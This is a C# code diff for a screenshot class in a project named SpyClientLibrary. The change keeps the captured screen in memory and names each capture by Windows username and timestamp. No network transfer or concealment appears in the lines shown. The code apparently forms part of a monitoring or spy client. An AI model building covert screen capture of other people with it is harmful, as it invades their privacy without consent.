@@ -10,7 +10,7 @@ namespace SpyClientLibrary
 {
     public class ScreenShot
     {
-        public Bitmap _currentScreen { get; }
+        public Bitmap _currentScreen { get; set; }
         public DateTime _scrrenData { get; set; }
         public string _user { get; set; }
         public string _screenName { get; set; }
@@ -20,7 +20,7 @@ namespace SpyClientLibrary
             getWindowsUser();
         }
 
-        public void generateCurrentScreen()
+        public ScreenShot generateCurrentScreen()
         {
             _scrrenData = DateTime.Now;
 
@@ -35,20 +35,28 @@ namespace SpyClientLibrary
                                      bmpScreenCapture.Size,
                                      CopyPixelOperation.SourceCopy);
                 }
-                bmpScreenCapture.Save("C:\\Users\\Michał\\Desktop\\" + _scrrenData.Millisecond+".bmp");
-              
-}
-          
-            
+                _currentScreen = bmpScreenCapture;    
+            }            
+            createScreenName();
+            return this;
         }
+
         private string createScreenName()
         {
-            _screenName = _user + _scrrenData.ToString() +".bmp";
+            //FORMAT : username_YYYY_M_D_h_m.bmp
+            _screenName = _user + "_" + 
+                          _scrrenData.Year.ToString() + "_" +
+                          _scrrenData.Month.ToString() +"_" +
+                          _scrrenData.Day.ToString() + "_" +
+                          _scrrenData.Hour.ToString() + "_" +
+                          _scrrenData.Minute.ToString() + ".bmp";
             return _screenName;
         }
         private void getWindowsUser()
         {
-            _user= System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            var computerName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            if (!string.IsNullOrEmpty(computerName))
+                _user = computerName.Substring(computerName.IndexOf("\\")+1);
         }
     }
 }
